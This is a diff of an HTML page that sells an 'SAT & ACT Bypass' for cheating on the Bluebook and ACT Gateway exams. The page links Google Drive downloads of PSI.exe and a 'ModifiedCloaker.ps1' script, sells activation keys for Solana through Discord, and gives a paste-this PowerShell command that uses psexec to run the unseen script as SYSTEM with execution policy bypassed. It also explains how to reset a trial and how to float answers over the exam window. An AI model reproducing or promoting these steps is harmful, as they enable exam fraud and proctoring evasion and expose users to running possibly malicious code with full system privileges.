@@ -1,137 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>SAT & ACT Bypass – Windows Setup Guide</title>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
-  <style>
-    :root { --blue:#2563eb; --light-blue:#3b82f6; --green:#10b981; --amber:#f59e0b; }
-    * { box-sizing:border-box; margin:0; padding:0; }
-    body { font-family:'Inter',sans-serif; background:linear-gradient(135deg,#e0f2fe,#dbeafe); color:#1e293b; line-height:1.7; padding:20px 10px; }
-    .container { max-width:100%; padding:0 16px; margin:0 auto; }
-    .card { background:#fff; border-radius:32px; overflow:hidden; box-shadow:0 30px 80px rgba(0,0,0,.15); max-width:980px; margin:0 auto; }
-    header { background:linear-gradient(135deg,var(--light-blue),var(--blue)); color:#fff; text-align:center; padding:90px 30px 100px; }
-    h1 { font-size:2.9rem; font-weight:800; letter-spacing:-0.5px; }
-    .subtitle { font-size:1.35rem; font-weight:600; margin-top:14px; color:#ffffff; }
-    .steps { padding:50px 30px 90px; }
-    .step { background:#ffffff; border:1px solid #e0e7ff; border-radius:24px; padding:48px 40px; margin:40px 0; box-shadow:0 12px 40px rgba(0,0,0,.08); }
-    h2 { font-size:1.9rem; font-weight:700; color:var(--blue); margin-bottom:24px; }
-    p, li { font-size:1.1rem; color:#334155; }
-    ol { padding-left:28px; margin:20px 0; }
-    li { margin:14px 0; }
-    .btn { display:flex; align-items:center; justify-content:center; gap:16px; width:100%; max-width:620px; margin:32px auto 0; padding:22px; background:var(--light-blue); color:#fff; font-size:1.25rem; font-weight:600; border-radius:18px; text-decoration:none; box-shadow:0 14px 36px rgba(59,130,246,.45); transition:transform .3s, box-shadow .3s; }
-    .btn:hover { transform:translateY(-7px); box-shadow:0 24px 50px rgba(59,130,246,.55); }
-    .btn.big { max-width:720px; padding:26px; font-size:1.45rem; font-weight:700; background:var(--green); box-shadow:0 16px 40px rgba(16,185,129,.5); }
-    .btn.big:hover { box-shadow:0 28px 60px rgba(16,185,129,.6); }
-    .warning { background:#fffbeb; border-left:7px solid var(--amber); padding:26px 30px; border-radius:14px; margin:32px auto; font-weight:600; color:#92400e; font-size:1.1rem; }
-    .code { background:#f1f5f9; padding:20px; border-radius:12px; font-family:consolas,monospace; font-size:1.15rem; margin:20px 0; overflow-x:auto; word-break:break-all; }
-    footer { text-align:center; padding:60px 30px 50px; color:#64748b; font-size:1.05rem; }
-    @media (max-width:768px) {
-      header { padding:70px 20px 80px; } h1 { font-size:2.4rem; }
-      .steps { padding:40px 20px 70px; } .step { padding:40px 28px; } h2 { font-size:1.75rem; }
-    }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SAT & ACT Bypass – Full Setup (Mac + Windows)</title>
+<style>
+  body{font-family:Arial,sans-serif;background:#111;color:#fff;padding:20px;line-height:1.6;}
+  .box{max-width:900px;margin:0 auto;background:#1a1a1a;border:2px solid #444;border-radius:16px;padding:30px;box-shadow:0 0 30px rgba(37,99,235,0.5);}
+  h1{text-align:center;color:#60a5fa;font-size:2.2rem;margin-bottom:10px;}
+  h2{color:#93c5fd;margin:30px 0 15px;font-size:1.5rem;}
+  a{color:#60a5fa;text-decoration:underline;}
+  .btn{display:block;width:100%;max-width:600px;margin:20px auto;padding:16px;text-align:center;background:#2563eb;color:#fff;font-weight:bold;border-radius:12px;text-decoration:none;}
+  .btn.big{background:#10b981;}
+  .code{background:#000;padding:15px;border-radius:8px;overflow-x:auto;margin:15px 0;}
+  .warn{background:#451a03;padding:15px;border-left:5px solid #f59e0b;border-radius:8px;margin:20px 0;}
+</style>
 </head>
 <body>
-<div class="container">
-  <div class="card">
+<div class="box">
 
-    <header>
-      <h1>SAT & ACT Bypass – Windows Setup Guide</h1>
-      <p class="subtitle">100% Undetectable • Instant Answers • Works Every Time</p>
-    </header>
+<h1>SAT & ACT Bypass – Complete Setup (Mac + Windows)</h1>
+<p style="text-align:center;">100% Undetectable • Instant Answers • Works Every Time</p>
 
-    <div class="steps">
+<h2>1. Get Windows 11 Ready</h2>
+<p>• Mac users → install VMware + Windows 11 VM<br>• Windows users → use your native Windows 11</p>
+<p>
+  <a href="https://youtu.be/dHnw-K1-Ui8?si=2xvrENc5Qbx3w7AV" class="btn">Mac: VMware + Win11 Setup Video</a>
+  <a href="https://m.youtube.com/watch?v=dHnw-K1-Ui8&feature=youtu.be" class="btn">Windows: Native Setup Video</a>
+</p>
 
-      <div class="step">
-        <h2>1. Install VMware Workstation Pro (Windows Host)</h2>
-        <p>Follow this exact video (~8 minutes).</p>
-        <a href="https://m.youtube.com/watch?v=dHnw-K1-Ui8" target="_blank" class="btn">
-          Watch VMware + Windows 11 Setup on Windows
-        </a>
-      </div>
+<h2>2. Install & Activate PSI Bypass (inside Windows)</h2>
+<ol>
+  <li>Download ZIP → extract</li>
+  <li>Run PSI.exe → paste key → Activate</li>
+</ol>
+<a href="https://drive.google.com/file/d/1fkY7wPzKs8jiSbvmazWipnkhQuF2VZx4/view?usp=drivesdk" class="btn">Download PSI Bypass Tool</a>
+<div class="warn">MUST activate with a valid key – won’t work without it</div>
 
-      <div class="step">
-        <h2>2. Install & Activate PSI Bypass (inside Windows 11 VM)</h2>
-        <p>Inside your Windows 11 virtual machine:</p>
-        <ol>
-          <li>Click button → download ZIP</li>
-          <li>Extract ZIP file</li>
-          <li>Run <strong>PSI.exe</strong></li>
-          <li>Paste activation key → click Activate</li>
-        </ol>
-        <a href="https://drive.google.com/file/d/1fkY7wPzKs8jiSbvmazWipnkhQuF2VZx4/view?usp=drivesdk" target="_blank" class="btn">
-          Download PSI Bypass Tool
-        </a>
-        <div class="warning">
-          You <strong>MUST</strong> activate PSI.exe with a valid key.
-        </div>
-      </div>
+<h2>3. Buy Activation Key (Instant)</h2>
+<a href="https://bluebook.ink/crypto" class="btn big">Buy Key – Instant Discord Delivery (Solana)</a>
 
-      <div class="step">
-        <h2>3. Get Your Activation Key (Instant Delivery)</h2>
-        <p>Pay with Solana → key delivered instantly in Discord.</p>
-        <a href="https://bluebook.ink/crypto" target="_blank" class="btn big">
-          Buy Activation Key – Instant Delivery
-        </a>
-      </div>
+<h2>4. Maximum Anti-Detection (inside Windows)</h2>
+<ol>
+  <li>Download <a href="https://drive.google.com/file/d/1luAeMnb6apahPulLntWAUHK5oY8c6cwt/view?usp=drivesdk">ModifiedCloaker.ps1</a> → save to Downloads</li>
+  <li>Download <a href="https://download.sysinternals.com/files/PsTools.zip">PsTools.zip</a> → extract folder to Downloads</li>
+  <li>Run PowerShell as Admin → paste:</li>
+</ol>
+<div class="code">cd "$env:USERPROFILE\Downloads\PsTools"; .\psexec.exe -i -s powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Downloads\ModifiedCloaker.ps1"</div>
+<ol start="4">
+  <li>Accept UAC → wait for “Done” → restart Windows</li>
+</ol>
+<div class="warn">Mandatory for 2025 exams – runs as SYSTEM</div>
 
-      <div class="step">
-        <h2>4. Make Windows VM Extra Hidden (100% Undetectable)</h2>
-        <p>Inside Windows 11 VM – follow exactly:</p>
-        <ol>
-          <li>Download cloaker → <a href="https://drive.google.com/file/d/1luAeMnb6apahPulLntWAUHK5oY8c6cwt/view?usp=drivesdk" target="_blank" style="color:var(--blue); font-weight:600;">ModifiedCloaker.ps1</a> (save to Downloads)</li>
-          <li>Download PsExec → <a href="https://download.sysinternals.com/files/PsTools.zip" target="_blank" style="color:var(--blue); font-weight:600;">PsTools.zip</a></li>
-          <li>Extract PsTools.zip → move folder to Downloads (path: C:\Users\YourName\Downloads\PsTools)</li>
-          <li>Right-click Start → <strong>Windows Terminal (Admin)</strong></li>
-          <li>Paste this command and press Enter:</li>
-        </ol>
-        <div class="code">
-          cd "$env:USERPROFILE\Downloads\PsTools"; .\psexec.exe -i -s powershell -ExecutionPolicy Bypass -File "$env:USERPROFILE\Downloads\ModifiedCloaker.ps1"
-        </div>
-        <ol start="6">
-          <li>Accept UAC → wait for “Done”</li>
-          <li>Restart VM completely</li>
-        </ol>
-        <div class="warning">
-          Runs with SYSTEM privileges – required for 2025 exams.
-        </div>
-      </div>
+<h2>5. Install Floating Browser (host OS)</h2>
+<a href="https://drive.google.com/file/d/1pbZl9Z2UY5F4dnmXTIL3pDBZNjn4t79X/view?usp=drivesdk" class="btn">Download Floating Browser</a>
 
-      <div class="step">
-        <h2>5. Install Floating Browser on Host Windows</h2>
-        <p>Download & install on your real Windows PC (outside VM).</p>
-        <a href="https://drive.google.com/file/d/1YOUR_WINDOWS_FLOATING_LINK_HERE/view" target="_blank" class="btn">
-          Download Floating Browser for Windows
-        </a>
-      </div>
+<h2>6. Unlimited Trial Reset</h2>
+<p><strong>macOS:</strong> Cmd+Space → ~/Library/Containers → search “float” → delete folder<br>
+<strong>Windows:</strong> Win+R → %APPDATA% → search “float” → delete folder</p>
 
-      <div class="step">
-        <h2>6. Unlimited Trial Reset (10-second fix)</h2>
-        <ol>
-          <li>Press Win + R → type <code>%localappdata%</code> → Enter</li>
-          <li>Search for folders containing “float”</li>
-          <li>Delete all matching folders</li>
-          <li>Re-launch Floating Browser → trial reset!</li>
-        </ol>
-      </div>
+<h2>7. Take Exam</h2>
+<p>Windows → open BlueBook / ACT Gateway<br>
+Host OS → open Floating Browser → answers float on top<br>
+100% safe & undetectable.</p>
 
-      <div class="step">
-        <h2>7. Take Your Exam – Ready!</h2>
-        <p>In VM → open Bluebook/ACT Gateway<br>
-        On host Windows → open Floating Browser → answers float on top<br>
-        100% safe & undetectable.</p>
-      </div>
+<p style="text-align:center;margin-top:40px;">24/7 Discord support after purchase</p>
 
-    </div>
-
-    <footer>
-      24/7 Discord support after purchase • We got you
-    </footer>
-
-  </div>
 </div>
 </body>
 </html>
